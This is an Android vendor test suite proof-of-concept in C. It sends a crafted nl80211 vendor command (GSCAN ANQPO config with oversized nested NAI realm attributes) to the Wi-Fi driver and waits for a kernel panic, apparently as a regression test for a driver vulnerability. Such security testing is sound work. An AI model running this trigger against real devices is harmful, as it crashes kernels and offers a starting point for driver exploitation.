/*
 * Copyright (C) 2016 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "poc_test.h"

#include <dlfcn.h>
#include <errno.h>
#include <limits.h>

#include <android/log.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <jni.h>
#include <sys/socket.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/msg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h> /* See NOTES */
#include <unistd.h>

#define ETH_ALEN 6

struct nl_sock *nl_sk;
#define NL80211_ATTR_IFINDEX 3

typedef enum {
  /* don't use 0 as a valid subcommand */
  VENDOR_NL80211_SUBCMD_UNSPECIFIED,

  /* define all vendor startup commands between 0x0 and 0x0FFF */
  VENDOR_NL80211_SUBCMD_RANGE_START = 0x0001,
  VENDOR_NL80211_SUBCMD_RANGE_END = 0x0FFF,

  /* define all GScan related commands between 0x1000 and 0x10FF */
  ANDROID_NL80211_SUBCMD_GSCAN_RANGE_START = 0x1000,
  ANDROID_NL80211_SUBCMD_GSCAN_RANGE_END = 0x10FF,

  /* define all RTT related commands between 0x1100 and 0x11FF */
  ANDROID_NL80211_SUBCMD_RTT_RANGE_START = 0x1100,
  ANDROID_NL80211_SUBCMD_RTT_RANGE_END = 0x11FF,

  ANDROID_NL80211_SUBCMD_LSTATS_RANGE_START = 0x1200,
  ANDROID_NL80211_SUBCMD_LSTATS_RANGE_END = 0x12FF,

  ANDROID_NL80211_SUBCMD_TDLS_RANGE_START = 0x1300,
  ANDROID_NL80211_SUBCMD_TDLS_RANGE_END = 0x13FF,

  ANDROID_NL80211_SUBCMD_DEBUG_RANGE_START = 0x1400,
  ANDROID_NL80211_SUBCMD_DEBUG_RANGE_END = 0x14FF,

  /* define all NearbyDiscovery related commands between 0x1500 and 0x15FF */
  ANDROID_NL80211_SUBCMD_NBD_RANGE_START = 0x1500,
  ANDROID_NL80211_SUBCMD_NBD_RANGE_END = 0x15FF,

  /* define all wifi calling related commands between 0x1600 and 0x16FF */
  ANDROID_NL80211_SUBCMD_WIFI_OFFLOAD_RANGE_START = 0x1600,
  ANDROID_NL80211_SUBCMD_WIFI_OFFLOAD_RANGE_END = 0x16FF,

  /* define all NAN related commands between 0x1700 and 0x17FF */
  ANDROID_NL80211_SUBCMD_NAN_RANGE_START = 0x1700,
  ANDROID_NL80211_SUBCMD_NAN_RANGE_END = 0x17FF,

  /* define all packet filter related commands between 0x1800 and 0x18FF */
  ANDROID_NL80211_SUBCMD_PKT_FILTER_RANGE_START = 0x1800,
  ANDROID_NL80211_SUBCMD_PKT_FILTER_RANGE_END = 0x18FF,

  /* This is reserved for future usage */

} ANDROID_VENDOR_SUB_COMMAND;

enum wl_vendor_subcmd {
  BRCM_VENDOR_SCMD_UNSPEC,
  BRCM_VENDOR_SCMD_PRIV_STR,
  GSCAN_SUBCMD_GET_CAPABILITIES = ANDROID_NL80211_SUBCMD_GSCAN_RANGE_START,
  GSCAN_SUBCMD_SET_CONFIG,
  GSCAN_SUBCMD_SET_SCAN_CONFIG,
  GSCAN_SUBCMD_ENABLE_GSCAN,
  GSCAN_SUBCMD_GET_SCAN_RESULTS,
  GSCAN_SUBCMD_SCAN_RESULTS,
  GSCAN_SUBCMD_SET_HOTLIST,
  GSCAN_SUBCMD_SET_SIGNIFICANT_CHANGE_CONFIG,
  GSCAN_SUBCMD_ENABLE_FULL_SCAN_RESULTS,
  GSCAN_SUBCMD_GET_CHANNEL_LIST,
  ANDR_WIFI_SUBCMD_GET_FEATURE_SET,
  ANDR_WIFI_SUBCMD_GET_FEATURE_SET_MATRIX,
  ANDR_WIFI_RANDOM_MAC_OUI,
  ANDR_WIFI_NODFS_CHANNELS,
  ANDR_WIFI_SET_COUNTRY,
  GSCAN_SUBCMD_SET_EPNO_SSID,
  WIFI_SUBCMD_SET_SSID_WHITELIST,
  WIFI_SUBCMD_SET_LAZY_ROAM_PARAMS,
  WIFI_SUBCMD_ENABLE_LAZY_ROAM,
  WIFI_SUBCMD_SET_BSSID_PREF,
  WIFI_SUBCMD_SET_BSSID_BLACKLIST,
  GSCAN_SUBCMD_ANQPO_CONFIG,
  WIFI_SUBCMD_SET_RSSI_MONITOR,
  WIFI_SUBCMD_CONFIG_ND_OFFLOAD,
  RTT_SUBCMD_SET_CONFIG = ANDROID_NL80211_SUBCMD_RTT_RANGE_START,
  RTT_SUBCMD_CANCEL_CONFIG,
  RTT_SUBCMD_GETCAPABILITY,
  RTT_SUBCMD_GETAVAILCHANNEL,
  RTT_SUBCMD_SET_RESPONDER,
  RTT_SUBCMD_CANCEL_RESPONDER,
  LSTATS_SUBCMD_GET_INFO = ANDROID_NL80211_SUBCMD_LSTATS_RANGE_START,
  DEBUG_START_LOGGING = ANDROID_NL80211_SUBCMD_DEBUG_RANGE_START,
  DEBUG_TRIGGER_MEM_DUMP,
  DEBUG_GET_MEM_DUMP,
  DEBUG_GET_VER,
  DEBUG_GET_RING_STATUS,
  DEBUG_GET_RING_DATA,
  DEBUG_GET_FEATURE,
  DEBUG_RESET_LOGGING,
  DEBUG_TRIGGER_DRIVER_MEM_DUMP,
  DEBUG_GET_DRIVER_MEM_DUMP,
  DEBUG_START_PKT_FATE_MONITORING,
  DEBUG_GET_TX_PKT_FATES,
  DEBUG_GET_RX_PKT_FATES,
  DEBUG_GET_WAKE_REASON_STATS,
  WIFI_OFFLOAD_SUBCMD_START_MKEEP_ALIVE =
      ANDROID_NL80211_SUBCMD_WIFI_OFFLOAD_RANGE_START,
  WIFI_OFFLOAD_SUBCMD_STOP_MKEEP_ALIVE,
  APF_SUBCMD_GET_CAPABILITIES = ANDROID_NL80211_SUBCMD_PKT_FILTER_RANGE_START,
  APF_SUBCMD_SET_FILTER,
  /* Add more sub commands here */
  VENDOR_SUBCMD_MAX
};

#define GSCAN_ATTRIBUTE_ANQPO_HS_LIST_SIZE 111
#define GSCAN_ATTRIBUTE_ANQPO_HS_LIST 110
#define GSCAN_ATTRIBUTE_ANQPO_HS_ROAM_CONSORTIUM_ID 114
#define GSCAN_ATTRIBUTE_ANQPO_HS_NAI_REALM 113

#define LOOP_COUNT 4
#define BUF_SIZE 256
#define OUI_GOOGLE 0x001A11

#define AID_INET 3003    /* can create AF_INET and AF_INET6 sockets */
#define AID_NET_RAW 3004 /* can create raw INET sockets */
#define AID_NET_ADMIN 3005


int send_testmode(const char *ifname, u_int16_t nlmsg_type, u_int32_t nlmsg_pid,
                  u_int8_t genl_cmd, u_int8_t genl_version) {
  struct nl_msg *msg;
  int ret;
  int i;
  unsigned char dst[ETH_ALEN];
  struct nlattr *rret;
  struct nlattr *rret2;
  struct nlattr *rret3;
  struct nlattr *rret4;
  unsigned char buf_test[BUF_SIZE];
  int if_index = if_nametoindex(ifname);
  msg = nlmsg_alloc();

  genlmsg_put(msg, nlmsg_pid, 0, nlmsg_type, 0, 0, genl_cmd, genl_version);

  nla_put_u32(msg, NL80211_ATTR_IFINDEX, if_index);

  nla_put_u32(msg, NL80211_ATTR_VENDOR_ID, OUI_GOOGLE);

  nla_put_u32(msg, NL80211_ATTR_VENDOR_SUBCMD, GSCAN_SUBCMD_ANQPO_CONFIG);
  rret = nla_nest_start(msg, NL80211_ATTR_VENDOR_DATA);

  if (!rret) {
    perror("nla_nest_start");
    return POC_TEST_FAIL;
  }

  nla_put_u32(msg, GSCAN_ATTRIBUTE_ANQPO_HS_LIST_SIZE, 1);

  rret2 = nla_nest_start(msg, GSCAN_ATTRIBUTE_ANQPO_HS_LIST);

  if (!rret2) {
    perror("nla_nest_start");
    return POC_TEST_FAIL;
  }

  for (i = 0; i < LOOP_COUNT; ++i) {
    rret3 = nla_nest_start(msg, GSCAN_ATTRIBUTE_ANQPO_HS_LIST);

    if (!rret3) {
      perror("nla_nest_start");
      return POC_TEST_FAIL;
    }

    nla_put(msg, GSCAN_ATTRIBUTE_ANQPO_HS_NAI_REALM, BUF_SIZE, &buf_test);
    nla_nest_end(msg, rret3);
  }

  nla_nest_end(msg, rret2);
  nla_nest_end(msg, rret);

  ret = nl_send_auto_complete(nl_sk, msg);
  /* To make sure that kernel panic occurs */
  sleep(5);
  return POC_TEST_PASS;
}


int main(int argc, char *argv[]) {
  VtsHostInput host_input = ParseVtsHostFlags(argc, argv);
  const char *ifname = host_input.params["ifname"].c_str();
  if (strlen(ifname) == 0) {
    fprintf(stderr, "ifname parameter is empty.");
    return POC_TEST_FAIL;
  }

  int ret = 0;
  int family_id = 0;

  if (getuid() != 0) {
    printf("need root privilege\n");
    return POC_TEST_FAIL;
  }

  gid_t gid_groups[] = {AID_INET, AID_NET_ADMIN};
  setgroups(sizeof(gid_groups) / sizeof(gid_groups[0]), gid_groups);

  setuid(2000);

  nl_sk = nl_socket_alloc();
  ret = genl_connect(nl_sk);
  if (ret != 0) {
    perror("genl_connect");
    return POC_TEST_FAIL;
  }

  family_id = genl_ctrl_resolve(nl_sk, "nl80211");

  ret = send_testmode(ifname, family_id, getpid(), NL80211_CMD_VENDOR, 1);

  return ret;
}
